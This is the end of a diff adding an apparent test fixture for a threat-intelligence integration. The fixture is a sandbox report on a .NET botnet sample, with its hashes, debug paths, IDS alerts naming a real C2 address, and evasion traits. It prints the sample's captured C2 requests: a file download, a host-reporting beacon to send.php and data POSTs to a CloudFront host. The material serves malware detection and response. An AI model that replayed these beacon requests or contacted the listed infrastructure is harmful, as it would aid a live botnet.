+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdce79e7b7dHost: d1s",
+                        "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdcf8e0626fHost: d1s"
+                    ]
+                },
+                {
+                    "Risk": "MODERATE",
+                    "Signature": "Checks the public IP address of the machine",
+                    "SignatureSources": [
+                        '',
+                        "name: wtfismyip.com"
+                    ]
+                },
+                {
+                    "Risk": "MODERATE",
+                    "Signature": "Snort IDS Alert for network traffic",
+                    "SignatureSources": [
+                        '',
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49705 -> 178.154.131.215:80",
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49706 -> 178.154.131.215:80",
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49710 -> 178.154.131.215:80",
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49711 -> 178.154.131.215:80",
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49712 -> 178.154.131.215:80",
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49716 -> 178.154.131.215:80",
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49717 -> 178.154.131.215:80",
+                        "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49718 -> 178.154.131.215:80"
+                    ]
+                }
+            ],
+            "SecurityBypass": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "Checks for kernel debuggers",
+                    "SignatureSources": [
+                        '',
+                        "KernelDebuggerInformation"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Contains long sleeps",
+                    "SignatureSources": [
+                        '',
+                        "delay time: 3600000",
+                        "delay time: 922337203685477"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Executes massive amount of sleeps in a loop",
+                    "SignatureSources": [
+                        '',
+                        "-1790256512353510857s >= -60000s",
+                        "-3600000s >= -60000s",
+                        "80 > 30"
+                    ]
+                },
+                {
+                    "Risk": "MODERATE",
+                    "Signature": "Sample sleeps for a long time (installer files shows these property).",
+                    "SignatureSources": [
+                        ''
+                    ]
+                },
+                {
+                    "Risk": "MODERATE",
+                    "Signature": "Found a high number of Window / User specific system calls",
+                    "SignatureSources": [
+                        '',
+                        "foregroundWindowGot 1497",
+                        "foregroundWindowGot 494",
+                        "threadDelayed 1941",
+                        "threadDelayed 36971",
+                        "threadDelayed 4118",
+                        "threadDelayed 448978"
+                    ]
+                }
+            ],
+            "Exploit": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "May try to detect the Windows Explorer process",
+                    "SignatureSources": [
+                        '',
+                        "+Mouse><LMouse><LMouse>[Program Manager]",
+                        "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse><LMouse>[Program Manager]p",
+                        "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]",
+                        "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]p",
+                        "<LMouse>[Program Manager]",
+                        "Program Manager",
+                        "Program Managerp",
+                        "[Program Manager] "
+                    ]
+                }
+            ],
+            "Stealth": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "Disables application error messages",
+                    "SignatureSources": [
+                        '',
+                        "NOOPENFILEERRORBOX",
+                        "NOOPENFILEERRORBOX",
+                        "NOOPENFILEERRORBOX",
+                        "NOOPENFILEERRORBOX",
+                        "NOOPENFILEERRORBOX",
+                        "NOOPENFILEERRORBOX",
+                        "NOOPENFILEERRORBOX",
+                        "NOOPENFILEERRORBOX"
+                    ]
+                }
+            ]
+        }
+    },
+    "raw": '{"Full Details": {"Summary": {"Status": "COMPLETED", "Category": "EXECS", "FileType": "EXE", "StartTime": 1620229320, "Duration": 658451}, "Classification": {"Type": "MALICIOUS", "Category": "MALWARE_BOTNET", "Score": 80, "DetectedMalware": "Gen:Variant.MSILPerseus.158871"}, "FileProperties": {"FileType": "EXE", "FileSize": 22016, "MD5": "542a09dbd513bf75e29572922ce0687e", "SHA1": "6e0d16aa60b37596774ed0d3054ed2ff39d9378f", "Sha256": "dbcb1fa12366b385224f1a203c8cc24d6740f4bfa3b4f7a9d6d9ff059f470819", "Issuer": "", "DigitalCerificate": "", "SSDeep": "384:UGaRIorFBiFKx5v38y3QLp29Jub/mPkaVIKvtMNokpkjUo165Dt:1JorvjxZPAgyQRt/7jUo1A", "RootCA": ""}, "SystemSummary": [{"Risk": "LOW", "Signature": "Binary contains paths to debug symbols", "SignatureSources": ["", "14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp", "C:\\\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp", "X8c:\\\\Users\\\\Julien\\\\Documents\\\\Visual Studio 2013\\\\Projects\\\\Botnet\\\\Botnet\\\\obj\\\\Release\\\\Botnet.pdb source: 14351.exe", "c:\\\\Users\\\\Julien\\\\Documents\\\\Visual Studio 2013\\\\Projects\\\\Botnet\\\\Botnet\\\\obj\\\\Release\\\\Botnet.pdb source: 14351.exe", "pC:\\\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp", "t.pdb source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp"]}, {"Risk": "LOW", "Signature": "Classification label", "SignatureSources": ["", "mal52.winEXE@2/1@2/4"]}, {"Risk": "LOW", "Signature": "Contains modern PE file flags such as dynamic base or NX", "SignatureSources": ["", "NO_SEH, TERMINAL_SERVER_AWARE, DYNAMIC_BASE, NX_COMPAT"]}, {"Risk": "LOW", "Signature": "Sample may offer command line options", "SignatureSources": ["", "delay time: 0", "delay time: 0", "delay time: 10", "delay time: 100", "delay time: 3600000", "delay time: 922337203685477"]}, {"Risk": "LOW", "Signature": "Creates guard pages", "SignatureSources": ["", "page read and write | page guard"]}, {"Risk": "LOW", "Signature": "Executable uses .NET runtime", "SignatureSources": ["", "C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\mscorlib\\\\5f07b97b8b64b1ad0f3033a0d991a7de\\\\mscorlib.ni.dll"]}, {"Risk": "LOW", "Signature": "PE file contains a COM descriptor data directory", "SignatureSources": ["", "data directory type: IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR"]}, {"Risk": "LOW", "Signature": "PE file contains a debug data directory", "SignatureSources": ["", "data directory type: IMAGE_DIRECTORY_ENTRY_DEBUG"]}, {"Risk": "LOW", "Signature": "PE file has an executable .text section and no other executable section", "SignatureSources": ["", "Section: .text IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_CNT_CODE, IMAGE_SCN_MEM_READ"]}, {"Risk": "LOW", "Signature": "Queries the volume information", "SignatureSources": ["", "C:\\\\14351.exe VolumeInformation"]}, {"Risk": "LOW", "Signature": "Reads software policies", "SignatureSources": ["", "HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\Safer\\\\CodeIdentifiers"]}, {"Risk": "LOW", "Signature": "Reads the hosts file", "SignatureSources": ["", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts"]}, {"Risk": "LOW", "Signature": "Sample monitors Window changes", "SignatureSources": [""]}, {"Risk": "LOW", "Signature": "Sample reads its own file content", "SignatureSources": ["", "C:\\\\14351.exe"]}, {"Risk": "LOW", "Signature": "Sample tries to load a library which is not present or installed on the analysis machine", "SignatureSources": [""]}, {"Risk": "LOW", "Signature": "Searches for user specific document files", "SignatureSources": ["", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents"]}, {"Risk": "LOW", "Signature": "Spawns processes", "SignatureSources": ["", "C:\\\\14351.exe \"C:\\\\14351.exe\" ", "C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe 0x4"]}, {"Risk": "LOW", "Signature": "Tries to load missing DLLs", "SignatureSources": ["", "secruntime.dll", "secruntime.dll", "secruntime.dll", "secruntime.dll"]}, {"Risk": "LOW", "Signature": "Uses an in-process (OLE) Automation server", "SignatureSources": ["", "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\\\InprocServer32"]}], "Networking": [{"Risk": "LOW", "Signature": "Downloads files from web servers via HTTP", "SignatureSources": ["", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net"]}, {"Risk": "LOW", "Signature": "Found strings which match to known social media URLs", "SignatureSources": ["", ".hotmail.com1&0 equals www.hotmail.com (Hotmail)", "hotmail.co.uk1 equals www.hotmail.com (Hotmail)", "hotmail.com1 equals www.hotmail.com (Hotmail)"]}, {"Risk": "LOW", "Signature": "Performs DNS lookups", "SignatureSources": ["", "queries for: wtfismyip.com"]}, {"Risk": "LOW", "Signature": "Posts data to web server", "SignatureSources": ["", "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdce79e7b7dHost: d1s"]}, {"Risk": "LOW", "Signature": "URLs found in memory or binary data", "SignatureSources": ["", "http://cacerts.digicert.com/digicertglobalcag2.crt0", "http://crl.globalsign.net/root-r2.crl0", "http://crl.securetrust.com/stca.crl0", "http://crl.usertrust.com/utn-userfirst-object.crl0)", "http://crl3.digicert.com/digicertglobalcag2.crl05", "http://crl3.digicert.com/digicertglobalrootca.crl0c", "http://crl3.digicert.com/digicertglobalrootg2.crl0=", "http://crl4.digicert.com/digicertglobalcag2.crl0"]}, {"Risk": "LOW", "Signature": "Uses HTTPS", "SignatureSources": ["", "HTTP traffic on port 443 -> 49701", "HTTP traffic on port 443 -> 49702", "HTTP traffic on port 443 -> 49703", "HTTP traffic on port 49701 -> 443", "HTTP traffic on port 49702 -> 443", "HTTP traffic on port 49703 -> 443"]}, {"Risk": "LOW", "Signature": "Uses a known web browser user agent for HTTP communication", "SignatureSources": ["", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdce79e7b7dHost: d1s", "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdcf8e0626fHost: d1s"]}, {"Risk": "MODERATE", "Signature": "Checks the public IP address of the machine", "SignatureSources": ["", "name: wtfismyip.com"]}, {"Risk": "MODERATE", "Signature": "Snort IDS Alert for network traffic", "SignatureSources": ["", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49705 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49706 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49710 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49711 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49712 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49716 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49717 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49718 -> 178.154.131.215:80"]}], "SecurityBypass": [{"Risk": "LOW", "Signature": "Checks for kernel debuggers", "SignatureSources": ["", "KernelDebuggerInformation"]}, {"Risk": "LOW", "Signature": "Contains long sleeps", "SignatureSources": ["", "delay time: 3600000", "delay time: 922337203685477"]}, {"Risk": "LOW", "Signature": "Executes massive amount of sleeps in a loop", "SignatureSources": ["", "-1790256512353510857s >= -60000s", "-3600000s >= -60000s", "80 > 30"]}, {"Risk": "MODERATE", "Signature": "Sample sleeps for a long time (installer files shows these property).", "SignatureSources": [""]}, {"Risk": "MODERATE", "Signature": "Found a high number of Window / User specific system calls", "SignatureSources": ["", "foregroundWindowGot 1497", "foregroundWindowGot 494", "threadDelayed 1941", "threadDelayed 36971", "threadDelayed 4118", "threadDelayed 448978"]}], "Exploit": [{"Risk": "LOW", "Signature": "May try to detect the Windows Explorer process", "SignatureSources": ["", "+Mouse><LMouse><LMouse>[Program Manager]", "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse><LMouse>[Program Manager]p", "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]", "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]p", "<LMouse>[Program Manager]", "Program Manager", "Program Managerp", "[Program Manager] "]}], "Stealth": [{"Risk": "LOW", "Signature": "Disables application error messages", "SignatureSources": ["", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX"]}]}}',
+    "inputs": {
+        "zia_full_report": True,
+        "zia_md5": "542a09dbd513bf75e29572922ce0687e"
+    },
+    "metrics": {
+        "version": "1.0",
+        "package": "fn-zia",
+        "package_version": "1.0.0",
+        "host": "Johnp-MacBook-Pro-2.galway.ie.ibm.com",
+        "execution_time_ms": 3082,
+        "timestamp": "2021-05-26 18:31:43"
+    }
+}
